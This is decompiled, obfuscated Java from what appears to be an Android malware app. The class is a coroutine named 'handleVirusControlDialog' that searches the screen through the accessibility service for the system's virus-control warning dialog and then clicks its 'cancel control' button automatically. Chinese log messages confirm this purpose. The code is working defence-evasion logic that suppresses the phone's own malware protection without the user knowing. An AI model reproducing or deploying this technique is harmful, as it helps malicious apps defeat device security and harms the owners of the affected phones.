package com.storm.safe.rock.service;

import android.view.accessibility.AccessibilityNodeInfo;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.AbstractC0715je;
import p000.AbstractC1117qo;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.cq0;
import p000.dh0;
import p000.kg1;
import p000.l10;
import p000.t60;
import p000.tz0;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$handleVirusControlDialog$1", m214403f = "dqtvuisjd.kt", m214404l = {}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class dqtvuisjd$handleVirusControlDialog$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public final /* synthetic */ dqtvuisjd f52566a1;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$handleVirusControlDialog$1(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52566a1 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$handleVirusControlDialog$1(this.f52566a1, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) throws Throwable {
        dqtvuisjd$handleVirusControlDialog$1 dqtvuisjd_handleviruscontroldialog_1 = (dqtvuisjd$handleVirusControlDialog$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2);
        C1351vv c1351vv = C1351vv.f60710b1;
        dqtvuisjd_handleviruscontroldialog_1.invokeSuspend(c1351vv);
        return c1351vv;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        String string;
        C1351vv c1351vv = C1351vv.f60710b1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        kg1.m213544f4(obj);
        try {
            AccessibilityNodeInfo accessibilityNodeInfoM211468g2 = this.f52566a1.m211468g2();
            if (accessibilityNodeInfoM211468g2 != null) {
                Iterator it = dh0.f55815g5.iterator();
                while (true) {
                    if (!it.hasNext()) {
                        break;
                    }
                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfoM211468g2.findAccessibilityNodeInfosByText((String) it.next());
                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                        Iterator<T> it2 = listFindAccessibilityNodeInfosByText.iterator();
                        while (it2.hasNext()) {
                            try {
                                cq0.m212492d5((AccessibilityNodeInfo) it2.next());
                            } catch (Exception unused) {
                            }
                        }
                        t60.m214726f4("dqtvuisjd", "🦠 检测到病毒应用管控弹窗，点击取消");
                        ArrayList arrayListM213298i5 = AbstractC0715je.m213298i5(dh0.f55753a3, AbstractC1117qo.m214451e7("取消管控"));
                        int size = arrayListM213298i5.size();
                        int i = 0;
                        while (true) {
                            if (i >= size) {
                                break;
                            }
                            Object obj2 = arrayListM213298i5.get(i);
                            i++;
                            String str = (String) obj2;
                            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = accessibilityNodeInfoM211468g2.findAccessibilityNodeInfosByText(str);
                            if (listFindAccessibilityNodeInfosByText2 != null && !listFindAccessibilityNodeInfosByText2.isEmpty()) {
                                for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText2) {
                                    CharSequence text = accessibilityNodeInfo.getText();
                                    if (text == null || (string = text.toString()) == null) {
                                        string = "";
                                    }
                                    if (string.equals(str) && accessibilityNodeInfo.isVisibleToUser()) {
                                        if (accessibilityNodeInfo.isClickable()) {
                                            accessibilityNodeInfo.performAction(16);
                                            t60.m214714d6("dqtvuisjd", "✅ 点击取消按钮成功");
                                            Iterator<T> it3 = listFindAccessibilityNodeInfosByText2.iterator();
                                            while (it3.hasNext()) {
                                                try {
                                                    cq0.m212492d5((AccessibilityNodeInfo) it3.next());
                                                } catch (Exception unused2) {
                                                }
                                            }
                                        } else {
                                            AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                                            for (int i2 = 0; parent != null && i2 < 2; i2++) {
                                                if (parent.isClickable()) {
                                                    parent.performAction(16);
                                                    t60.m214714d6("dqtvuisjd", "✅ 点击取消按钮父节点成功");
                                                    Iterator<T> it4 = listFindAccessibilityNodeInfosByText2.iterator();
                                                    while (it4.hasNext()) {
                                                        try {
                                                            cq0.m212492d5((AccessibilityNodeInfo) it4.next());
                                                        } catch (Exception unused3) {
                                                        }
                                                    }
                                                } else {
                                                    parent = parent.getParent();
                                                }
                                            }
                                        }
                                    }
                                }
                                Iterator<T> it5 = listFindAccessibilityNodeInfosByText2.iterator();
                                while (it5.hasNext()) {
                                    try {
                                        cq0.m212492d5((AccessibilityNodeInfo) it5.next());
                                    } catch (Exception unused4) {
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            tz0.m214807a7("❌ 处理病毒管控弹窗失败: ", e.getMessage(), "dqtvuisjd");
        }
        return c1351vv;
    }
}
